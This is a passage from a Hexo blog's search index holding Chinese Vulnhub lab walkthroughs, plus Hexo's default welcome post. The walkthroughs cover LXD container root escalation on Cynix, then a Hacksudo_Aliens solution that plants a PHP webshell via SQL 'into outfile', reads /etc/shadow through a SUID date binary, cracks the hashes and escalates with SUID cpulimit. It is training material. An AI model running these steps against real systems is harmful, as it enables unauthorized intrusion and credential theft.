alt="img"></p><p>将图中框框的复制到靶机中</p><p><img src="/Vulnhub/Cynix/7647572c26de49c49b2eadd1d2c6feec.png" alt="img"></p><p><img src="/Vulnhub/Cynix/0857b7b2bc3a4b4bb6f770c636e63e90.png" alt="img"></p><p>5.导入镜像.并对其重命名为hacker 哈哈明目张胆</p><p>命令: lxc image import alpine-v3.19-x86_64-20240507_0744.tar.gz –alias hacker</p><p><img src="/Vulnhub/Cynix/ec2da0c7c35c479da0bc5ce3e5769f2d.png" alt="img"></p><p>6.创建容器</p><p>命令: lxc init hacker hacker -c security.privileged&#x3D;true</p><p><img src="/Vulnhub/Cynix/807a4769699b4bb5b364ce029b340da5.png" alt="img"></p><p>7.将容器hacker 挂载到&#x2F;mnt&#x2F;root下</p><p>命令: lxc config device add fromkali fromkali disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</p><p><img src="/Vulnhub/Cynix/490e3cd34ca44ce0bf82bd4a81207bd3.png" alt="img"></p><p>8.启动容器hacker!</p><p>命令: lxc start hacker</p><p><img src="/Vulnhub/Cynix/a7ccd9657bdd4256a34927740a514315.png" alt="img"></p><p>9.与主机交互!</p><p>命令: lxc exec hacker &#x2F;bin&#x2F;sh</p><p><img src="/Vulnhub/Cynix/9bdff13d5eee481eb0c787244ca90838.png" alt="img"></p><p>10.豪取flag</p><p><img src="/Vulnhub/Cynix/cc68c74e8fc94c9ba0de58e8da92ddf6.png" alt="img"></p><p><em><strong>但使龙城飞将在</strong></em></p><p><em><strong>不教胡马度阴山</strong></em></p><p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p><p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机随笔-Hacksudo_Aliens</title>
      <link href="/2024/05/11/Vulnhub%E9%9D%B6%E6%9C%BAHacksudo_Aliens%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/05/11/Vulnhub%E9%9D%B6%E6%9C%BAHacksudo_Aliens%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机Hacksudo-Aliens详解"><a href="#Vulnhub靶机Hacksudo-Aliens详解" class="headerlink" title="Vulnhub靶机Hacksudo_Aliens详解:"></a>Vulnhub靶机Hacksudo_Aliens详解:</h1><p>攻击机Kali  IP:192.168.3.44</p><p>靶机    IP:未知  系统:未知</p><p><strong>A.信息收集</strong></p><p><strong>扫描靶机存活性 确定IP地址</strong></p><p>1.命令:arp-scan -l</p><p><img src="/Vulnhub/image/f43b7edc9a914dd5811a8512273e8f02.png" alt="img"></p><p><strong>扫描靶机开放端口及其服务版本信息</strong></p><p>2.命令 nmap -A -p- -sV 靶机IP地址</p><p>靶机开放三个端口,22ssh端口,80web端口,9000是数据库图形化界面</p><p><img src="/Vulnhub/image/9084c7a3026d4a0aa10199697e3daf9d.png" alt="img"><br>3.对80端口进行子目录挖掘,这里使用暴力工具gobuster</p><p>命令 gobuster dir -u 目标URL -w 字典 -x 文件扩展名</p><p>通过挖掘,发现目录backup存在一个数据库备份文件mysql.bak</p><p><img src="/Vulnhub/image/694b5efe1d5d48a58dfc7a01516177d0.png" alt="img"></p><p><img src="/Vulnhub/image/9358a6abd3d744b786b7809b12b02129.png" alt="img"></p><p>4.将mysql.bak下载下来,查看一下里面的内容,得到一个用户名及其密码:vishal@hacksudo</p><p><img src="/Vulnhub/image/7d0f65debe6844188f98de4a25097a13.png" alt="img"></p><p>5.通过phpmyadmin登录mysql.进入数据库,我第一步去看了一眼user表,发现root用户和vishal用户加密过的密码一致,于是我退出当前登录,登上了root用户,这一步是考虑到可能存在权限的问题,为后面做铺垫,用不上也无所谓</p><p><img src="/Vulnhub/image/6ebb678c3920470ba893ee5dd99b3ccd.png" alt="img"></p><p>6.既然我们可以登录mysql,那么首当其冲要想到sql一句话木马注入,利用 into outfile</p><p>如下图,我大胆往&#x2F;var&#x2F;www&#x2F;html目录下写入了一个名为hacker.php的木马文件</p><p><img src="/Vulnhub/image/df193a3b1717437a90855960d53125fc.png" alt="img"></p><p>7.由于我用的POST传参,所以开启我们的antsward(蚁剑,菜刀也行),并添加数据,能够进入虚拟终端</p><p><img src="/Vulnhub/image/bbc905b9ce2e44e8a3606ba048cf3221.png" alt="img"></p><p><img src="/Vulnhub/image/6eb03cc16379464690250f43664dec2e.png" alt="img"></p><p><strong>B.破解 &#x2F;etc&#x2F;shadow</strong></p><p>1.使用常规的提权姿势,发现存在一个suid权限的date文件,刚好date的-f选项可以读取文件,SO…</p><p>补充一个提权网址: <a href="https://gtfobins.github.io/">GTFOBins</a></p><p><img src="/Vulnhub/image/db02ab68e0954359a4f42fefa45b6d8c.png" alt="img"></p><p>2.我们从GRFOBins上查询date提权的方法,果真有,如下图</p><p><img src="/Vulnhub/image/8bf526ecd28843359d4e53f239b3ea90.png" alt="img"></p><p>3.因此我们只需要输入如下命令,即可读取到&#x2F;etc&#x2F;shadow文件</p><p>命令: date -f &#x2F;etc&#x2F;shadow</p><p>得到两个用户的hash值密码,root先放一放,不太可能一下就得到root密码哈哈</p><p><img src="/Vulnhub/image/c92e3b460cde41f192fd2007d071f657.png" alt="img"></p><p>4.将用户hacksudo这一串全部复制到kali里,利用john爆破</p><p>得到用户及其密码hacksudo@aliens</p><p><img src="/Vulnhub/image/a7c47ef41c5d434c8b26c27c7d4ca13b.png" alt="img"></p><p><strong>C.提权</strong> </p><p><a href="mailto:1.首先我们利用用户hacksudo@aliens">1.首先我们利用用户hacksudo@aliens</a>登录ssh</p><p><img src="/Vulnhub/image/75a6510719ee4424af9aec615b505825.png" alt="img"></p><p>2.翻阅当前目录,获取第一个flag</p><p><img src="/Vulnhub/image/1aa654f0bdc04b2bb9ad59798173fc39.png" alt="img"></p><p>3.继上篇文章之后,习惯性直接跑LinEnum.sh脚本.显然 太好用了!!</p><p>在hacksudo的家目录Downloads文件夹中就存放着一个suid文件cpulimit</p><p><img src="/Vulnhub/image/d71272c55ee044c8aa8dd696db3c0b7e.png" alt="img"></p><p><img src="/Vulnhub/image/3b402bfa7d7f4695bb5a1230ad351e00.png" alt="img"></p><p>4.继续上GTFOBins搜索cpulimit,结果是他居然也有提权方法!</p><p><img src="/Vulnhub/image/816974fc6b6d4e65ab13c5ef7b0fd7f8.png" alt="img"></p><p>下图是cpulimit的使用方法</p><p><img src="/Vulnhub/image/ad831217758e4a0c9491e65141ddf9c1.png" alt="img"></p><p>再回到cpulimit提权的命令,就显然易见了,通过具有suid权限的cpulimit将执行&#x2F;bin&#x2F;sh的cpu使用率调至100%,也就是强制让电脑一心一意执行&#x2F;bin&#x2F;sh</p><p>(很恐怖啊这个工具,体现了权限设置的重要性)</p><p><img src="/Vulnhub/image/35393e6a096243f099cd2b68f4900645.png" alt="img"></p><p>5.所以我们只需要将命令复制到靶机中,即可完成提权</p><p><img src="/Vulnhub/image/d265640d95ca4dd18a313e6502c39c90.png" alt="img"></p><p><em><strong>老骥伏枥，志在千里；</strong></em></p><p><em><strong>烈士暮年，壮心不已</strong></em></p><p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p><p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/05/10/hello-world/"/>
      <url>/2024/05/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
